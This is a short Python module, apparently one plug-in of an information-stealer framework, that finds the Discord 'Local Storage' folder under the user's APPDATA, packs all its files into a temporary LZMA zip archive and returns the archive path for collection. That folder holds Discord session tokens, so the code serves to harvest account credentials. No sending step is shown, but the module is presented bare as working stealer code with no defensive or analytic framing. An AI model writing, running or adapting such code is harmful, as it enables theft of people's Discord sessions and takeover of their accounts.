# -*- coding: utf-8 -*-
import os, tempfile, zipfile


class Discord:
    def run(self, profile):
        x = '{APPDATA}\\Discord\\Local Storage'.format(**profile)
        if os.path.isdir(x):
            src = x
            dst = tempfile.mktemp(suffix='.zip')
            with zipfile.ZipFile(dst, "w", zipfile.ZIP_LZMA) as zf:
                for dirname, subdirs, files in os.walk(src):
                    for filename in files:
                        absname = os.path.abspath(os.path.join(dirname, filename))
                        zf.write(absname, absname[len(src) + 1:])
            return {src: dst}


modules = {"Discord": Discord()}
